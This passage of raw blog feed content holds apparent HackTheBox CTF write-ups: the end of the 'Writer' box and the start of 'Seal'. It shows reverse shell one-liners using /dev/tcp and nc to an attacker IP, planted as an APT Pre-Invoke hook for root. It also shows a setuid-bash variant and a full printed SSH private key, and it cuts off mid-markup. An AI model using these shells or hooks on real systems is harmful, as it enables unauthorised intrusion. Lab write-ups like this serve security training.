250 2.1.5 Ok
DATA
From: kyle@writer.htb
To: john@writer.htb
Subject: Test
Date: Thu, 20 Dec 2012 12:00:00 +0000

Testing
.354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;

250 2.0.0 Ok: queued as 36E8269C
QUIT
221 2.0.0 Bye
EXIT
kyle@writer:~$
────────────────────────────────────────────────────────────────────
rlwrap nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 172.19.0.1 58592
bash: cannot set terminal process group (927390): Inappropriate ioctl for device
bash: no job control in this shell
john@writer:/var/spool/postfix$ id
id
uid=1001(john) gid=1001(john) groups=1001(john)
</code></pre>
<h3 id="python-approach">python approach</h3>
<p>A faster approach and more effective approach is to use python or the sendmail command after SSH forward the SMTP port. I have chosen local port 9025.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python3</span>
<span style="color:#ff79c6">import</span> smtplib

h, p <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;127.0.0.1&#39;</span>, <span style="color:#bd93f9">9025</span>
From <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;kyle@writer.htb&#39;</span>
To <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;john@writer.htb&#39;</span>

Message <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;&#39;</span><span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span><span style="color:#f1fa8c">Subject: Hi John
</span><span style="color:#f1fa8c">
</span><span style="color:#f1fa8c">Regards
</span><span style="color:#f1fa8c">&#39;&#39;&#39;</span>

io <span style="color:#ff79c6">=</span> smtplib<span style="color:#ff79c6">.</span>SMTP(h,p)
<span style="color:#ff79c6">try</span>:
    io<span style="color:#ff79c6">.</span>ehlo()
    io<span style="color:#ff79c6">.</span>sendmail(From,To,Message)
<span style="color:#ff79c6">except</span> Exceptions <span style="color:#ff79c6">as</span> e:
    <span style="color:#8be9fd;font-style:italic">print</span> (e)
<span style="color:#ff79c6">finally</span>:
    io<span style="color:#ff79c6">.</span>quit()
</code></pre></td></tr></table>
</div>
</div><p>We start a netcat listener, copy the modified disclaimer and immediately send the email</p>
<pre><code>ssh kyle@writer.htb -L 9025:localhost:25
kyle@writer:~$ cp ./disclaimer /etc/postfix/
────────────────────────────────────────────────────────────────────
python3 send_email.py
────────────────────────────────────────────────────────────────────
rlwrap nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 172.19.0.1 58628
bash: cannot set terminal process group (951191): Inappropriate ioctl for device
bash: no job control in this shell
john@writer:/var/spool/postfix$
</code></pre>
<h3 id="command-line-approach">Command-line approach</h3>
<pre><code>sudo apt install swaks
swaks --to john@writer.htb --from kyle@john.htb --header &quot;Subject: Hi&quot; --body &quot;Regards&quot; --server 127.0.0.1 --port 9025

You can even [use curl to send email](https://blog.edmdesigner.com/send-email-from-linux-command-line/)
</code></pre>
<h3 id="stable-shell-with-ssh-as-john">Stable shell with SSH as john</h3>
<pre><code>john@writer:/home/john/.ssh$ cat id_rsa
cat &gt;  id_rsa &lt;&lt; EOF
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
EOF
ssh -i id_rsa john@writer.htb
john@writer:~$ id
uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
</code></pre>
<p>The management group needs to be explored:</p>
<pre><code>find / -group management 2&gt;/dev/null
/etc/apt/apt.conf.d
</code></pre>
<p>The folder belongs to management group, and we have write permissions:</p>
<pre><code>john@writer:/etc/apt/apt.conf.d$ ls -l /etc/apt | grep apt.conf.d
drwxrwxr-x 2 root management 4096 Oct 27 17:56 apt.conf.d
john@writer:/etc/apt/apt.conf.d$ ls -la /etc/apt/apt.conf.d
total 48
drwxrwxr-x 2 root management 4096 Oct 27 17:56 .
drwxr-xr-x 7 root root       4096 Jul  9 10:59 ..
-rw-r--r-- 1 root root        630 Apr  9  2020 01autoremove
-rw-r--r-- 1 root root         92 Apr  9  2020 01-vendor-ubuntu
-rw-r--r-- 1 root root        129 Dec  4  2020 10periodic
-rw-r--r-- 1 root root        108 Dec  4  2020 15update-stamp
-rw-r--r-- 1 root root         85 Dec  4  2020 20archive
-rw-r--r-- 1 root root       1040 Sep 23  2020 20packagekit
-rw-r--r-- 1 root root        114 Nov 19  2020 20snapd.conf
-rw-r--r-- 1 root root        625 Oct  7  2019 50command-not-found
-rw-r--r-- 1 root root        182 Aug  3  2019 70debconf
-rw-r--r-- 1 root root        305 Dec  4  2020 99update-notifier
</code></pre>
<h3 id="apt-privesc">APT privesc</h3>
<p>Resources:</p>
<ul>
<li><a href="https://gtfobins.github.io/gtfobins/apt-get/">https://gtfobins.github.io/gtfobins/apt-get/</a></li>
<li><a href="https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/">https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/</a></li>
</ul>
<p>We can create a file <strong>01-reverse-shell</strong> :</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">cat &gt; /etc/apt/apt.conf.d/01-reverse-shell <span style="color:#f1fa8c">&lt;&lt; EOF
</span><span style="color:#f1fa8c">apt::Update::Pre-Invoke {&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.44/445 0&gt;&amp;1&#39;&#34;};
</span><span style="color:#f1fa8c">EOF</span>
</code></pre></td></tr></table>
</div>
</div><p>We copy the file and we start a netcat listener on port 445. We can monitor with pspy when is the next apt update:</p>
<pre tabindex="0"><code>rlwrap nc -lvnp 445
Listening on 0.0.0.0 445
Connection received on 172.19.0.1 65422
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
3fa76d8d71c2c0ccbc57f2e7034b1992
</code></pre><p>Different reverse shells can be used to get privesc here:</p>
<pre><code>echo 'apt::Update::Pre-Invoke {&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.44 445 &gt;/tmp/f&quot;};' &gt; /etc/apt/apt.conf.d/01-reverse-shell
echo &quot;apt::Update::Pre-Invoke {\&quot;bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.44/445 0&gt;&amp;1'\&quot;};&quot; &gt; /etc/apt/apt.conf.d/01-reverse-shell
echo 'apt::Update::Pre-Invoke {&quot;chmod +s /bin/bash&quot;};' &gt; /etc/apt/apt.conf.d/01-shell-as-root
</code></pre>
]]></content></item><item><title>Htb Seal</title><link>https://0xade1.github.io/posts/2021/10/htb-seal/</link><pubDate>Sun, 24 Oct 2021 20:06:41 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/10/htb-seal/</guid><description>rustscan -a 10.10.10.250 -t 2000 -- -Pn -A -sCV Open 10.10.10.250:22 Open 10.10.10.250:443 Open 10.10.10.250:8080 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) 443/tcp open ssl/http syn-ack nginx 1.18.0 (Ubuntu) | http-methods: |_ Supported Methods: OPTIONS GET HEAD POST |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Seal Market | ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK/emailAddress=admin@seal.htb/organizationalUnitName=Infra/localityName=Hackney | Issuer: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK/emailAddress=admin@seal.htb/organizationalUnitName=Infra/localityName=hackney | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2021-05-05T10:24:03 | Not valid after: 2022-05-05T10:24:03 | MD5: 9c4f 991a bb97 192c df5a c513 057d 4d21 | SHA-1: 0de4 6873 0ab7 3f90 c317 0f7b 872f 155b 305e 54ef | -----BEGIN CERTIFICATE----- | MIIDiDCCAnACAWQwDQYJKoZIhvcNAQELBQAwgYkxCzAJBgNVBAYTAlVLMQ8wDQYD | VQQIDAZMb25kb24xEDAOBgNVBAcMB2hhY2tuZXkxFTATBgNVBAoMDFNlYWwgUHZ0 | IEx0ZDEOMAwGA1UECwwFSW5mcmExETAPBgNVBAMMCHNlYWwuaHRiMR0wGwYJKoZI | hvcNAQkBFg5hZG1pbkBzZWFsLmh0YjAeFw0yMTA1MDUxMDI0MDNaFw0yMjA1MDUx | MDI0MDNaMIGJMQswCQYDVQQGEwJVSzEPMA0GA1UECAwGTG9uZG9uMRAwDgYDVQQH | DAdIYWNrbmV5MRUwEwYDVQQKDAxTZWFsIFB2dCBMdGQxDjAMBgNVBAsMBUluZnJh | MREwDwYDVQQDDAhzZWFsLmh0YjEdMBsGCSqGSIb3DQEJARYOYWRtaW5Ac2VhbC5o | dGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDafbynnscdjWeuXTrD | M36rTJ0y2pJpDDFe9ngryz/xw1KsoPfEDrDE0XHc8LVlD9cxXd/8+0feeV34d63s | YyZ0t5tHlAKw1h9TEa/og1yR1MyxZRf+K/wcX+OwXYFtMHkXCZFH7TPXLKtCrMJM | Z6GCt3f1ccrI10D+/dMo7eyQJsat/1e+6PgrTWRxImcjOCDOZ1+mlfSkvmr5TUBW | SU3uil2Qo5Kj9YLCPisjKpVuyhHU6zZ5KuBXkudaPS0LuWQW1LTMyJzlRfoIi9J7 | E2uUQglrTKKyd3g4BhWUABbwyxoj2WBbgvVIdCGmg6l8JPRZXwdLaPZ/FbHEQ47n | YpmtAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAJZGFznhRSEa2DTgevXl1T8uxpiG | PPd9R0whiIv3s225ir9SWW3Hl1tVkEY75G4PJA/DxmBIHxIK1OU8kZMuJUevnSIC | rK16b9Y5Y1JEnaQwfKCoQILMU40ED76ZIJigGqAoniGCim/mwR1F1r1g63oUttDT | aGLrpvN6XVkqSszpxTMMHk3SqwNaKzsaPKWPGuEbj9GGntRo1ysqZfBttgUMFIzl | 7un7bBMIn+SPFosNGBmXIU9eyR7zG+TmpGYvTgsw0ZJqZL9yQIcszJQZPV3HuLJ8 | 8srMeWYlzSS1SOWrohny4ov8jpMjWkbdnDNGRMXIUpapho1R82hyP7WEfwc= |_-----END CERTIFICATE----- | tls-alpn: |_ http/1.</description><content type="html"><![CDATA[<h2 id="heading"></h2>
<pre><code>rustscan -a 10.10.10.250 -t 2000  -- -Pn -A -sCV
Open 10.10.10.250:22
Open 10.10.10.250:443
Open 10.10.10.250:8080

PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
443/tcp  open  ssl/http   syn-ack nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Seal Market
| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK/emailAddress=admin@seal.htb/organizationalUnitName=Infra/localityName=Hackney
| Issuer: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK/emailAddress=admin@seal.htb/organizationalUnitName=Infra/localityName=hackney
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-05T10:24:03
| Not valid after:  2022-05-05T10:24:03
| MD5:   9c4f 991a bb97 192c df5a c513 057d 4d21
| SHA-1: 0de4 6873 0ab7 3f90 c317 0f7b 872f 155b 305e 54ef
| -----BEGIN CERTIFICATE-----
| MIIDiDCCAnACAWQwDQYJKoZIhvcNAQELBQAwgYkxCzAJBgNVBAYTAlVLMQ8wDQYD
| VQQIDAZMb25kb24xEDAOBgNVBAcMB2hhY2tuZXkxFTATBgNVBAoMDFNlYWwgUHZ0
| IEx0ZDEOMAwGA1UECwwFSW5mcmExETAPBgNVBAMMCHNlYWwuaHRiMR0wGwYJKoZI
| hvcNAQkBFg5hZG1pbkBzZWFsLmh0YjAeFw0yMTA1MDUxMDI0MDNaFw0yMjA1MDUx
| MDI0MDNaMIGJMQswCQYDVQQGEwJVSzEPMA0GA1UECAwGTG9uZG9uMRAwDgYDVQQH
| DAdIYWNrbmV5MRUwEwYDVQQKDAxTZWFsIFB2dCBMdGQxDjAMBgNVBAsMBUluZnJh
| MREwDwYDVQQDDAhzZWFsLmh0YjEdMBsGCSqGSIb3DQEJARYOYWRtaW5Ac2VhbC5o
| dGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDafbynnscdjWeuXTrD
| M36rTJ0y2pJpDDFe9ngryz/xw1KsoPfEDrDE0XHc8LVlD9cxXd/8+0feeV34d63s
| YyZ0t5tHlAKw1h9TEa/og1yR1MyxZRf+K/wcX+OwXYFtMHkXCZFH7TPXLKtCrMJM
| Z6GCt3f1ccrI10D+/dMo7eyQJsat/1e+6PgrTWRxImcjOCDOZ1+mlfSkvmr5TUBW
| SU3uil2Qo5Kj9YLCPisjKpVuyhHU6zZ5KuBXkudaPS0LuWQW1LTMyJzlRfoIi9J7
| E2uUQglrTKKyd3g4BhWUABbwyxoj2WBbgvVIdCGmg6l8JPRZXwdLaPZ/FbHEQ47n
| YpmtAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAJZGFznhRSEa2DTgevXl1T8uxpiG
| PPd9R0whiIv3s225ir9SWW3Hl1tVkEY75G4PJA/DxmBIHxIK1OU8kZMuJUevnSIC
| rK16b9Y5Y1JEnaQwfKCoQILMU40ED76ZIJigGqAoniGCim/mwR1F1r1g63oUttDT
| aGLrpvN6XVkqSszpxTMMHk3SqwNaKzsaPKWPGuEbj9GGntRo1ysqZfBttgUMFIzl
| 7un7bBMIn+SPFosNGBmXIU9eyR7zG+TmpGYvTgsw0ZJqZL9yQIcszJQZPV3HuLJ8
| 8srMeWYlzSS1SOWrohny4ov8jpMjWkbdnDNGRMXIUpapho1R82hyP7WEfwc=
|_-----END CERTIFICATE-----
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1
8080/tcp open  http-proxy syn-ack
| fingerprint-strings:
[..]
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Sun, 24 Oct 2021 12:03:05 GMT
|     Set-Cookie: JSESSIONID=node010k76pfhwfwkxjadymh9z3z9a1.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
</code></pre>
<h2 id="http-tcp8080---gibucket-website-and-tcp443-seal-market">http TCP/8080 - GiBucket website and TCP/443 Seal Market</h2>
<p>On port 443 a tomcat is running a website <strong>seal market</strong>:</p>
<pre><code>gobuster dir -k -u https://seal.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 30
/css (Status: 302)
/images (Status: 302)
/admin (Status: 302)
/js (Status: 302)
/manager (Status: 302)
/icon (Status: 302)
</code></pre>
<p>On port 8080, after registration of a new account, we access a gitbucket website which contains the Tomcat website source code of the seal market. The README has a nice ToDo list:</p>
<pre><code>Remove mutual authentication for dashboard, setup registration and login features.
Deploy updated tomcat configuration.
Disable manager and host-manager.
</code></pre>
<p>However we were are being denied access (status_code 403) to the dashboard, and manager interface.</p>
<p>on the <strong>infra</strong> repository, we find main.yml file with the Java and tomcat version but none have an exploit available.</p>
<pre><code>- name: Install Java 1.8
  yum: name=java-1.8.0-openjdk state=present
  [..]
- name: Download Tomcat
  get_url: url=http://archive.apache.org/dist/tomcat/tomcat-8/v8.0.61/bin/apache-tomcat-8.0.61.tar.gz dest=/opt/apache-tomcat-8.0.61.tar.gz
  [..]
</code></pre>
<p>Looking at nginx configuration <strong>sites-enabled/default</strong>, we can see the access to manager and dashboard interface is protected by certificate authentication:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">ssl_client_certificate <span style="color:#ff79c6">/</span><span style="color:#ff79c6">var</span><span style="color:#ff79c6">/</span>www<span style="color:#ff79c6">/</span>keys<span style="color:#ff79c6">/</span>selfsigned<span style="color:#ff79c6">-</span>ca<span style="color:#ff79c6">.</span>crt;

server {
[<span style="color:#ff79c6">..</span>]
    location <span style="color:#ff79c6">/</span>manager<span style="color:#ff79c6">/</span>html {
        <span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$ssl_client_verify</span> <span style="color:#ff79c6">!=</span> SUCCESS) { <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">403</span>; }
        [<span style="color:#ff79c6">..</span>]
        proxy_redirect      http<span style="color:#ff79c6">://</span>localhost<span style="color:#ff79c6">:</span><span style="color:#bd93f9">8000</span> https<span style="color:#ff79c6">://</span><span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>;
    }
    location <span style="color:#ff79c6">/</span>admin<span style="color:#ff79c6">/</span>dashboard {
        <span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$ssl_client_verify</span> <span style="color:#ff79c6">!=</span> SUCCESS) { <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">403</span>; }
        [<span style="color:#ff79c6">..</span>]
        proxy_redirect      http<span style="color:#ff79c6">://</span>localhost<span style="color:#ff79c6">:</span><span style="color:#bd93f9">8000</span> https<span style="color:#ff79c6">://</span><span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>;
    }
    location <span style="color:#ff79c6">/</span>host<span style="color:#ff79c6">-</span>manager<span style="color:#ff79c6">/</span>html {
        <span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$ssl_client_verify</span> <span style="color:#ff79c6">!=</span> SUCCESS) { <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">403</span>; }
        [<span style="color:#ff79c6">..</span>]
        proxy_redirect      http<span style="color:#ff79c6">://</span>localhost<span style="color:#ff79c6">:</span><span style="color:#bd93f9">8000</span> https<span style="color:#ff79c6">://</span><span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>;
    }
}
</code></pre></td></tr></table>
</div>
</div><p>I found this resource to explain me how client-certificate authentication works with nginx: <a href="https://jason.whitehorn.us/blog/2019/02/01/client-certificate-auth-with-nginx/">https://jason.whitehorn.us/blog/2019/02/01/client-certificate-auth-with-nginx/</a> .</p>
<p>On tomcat/tomcat-users.xml we find the manager password removed by an older commit 971f3aa3f0a0cc8aac12fd696d9631ca540f44c7:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
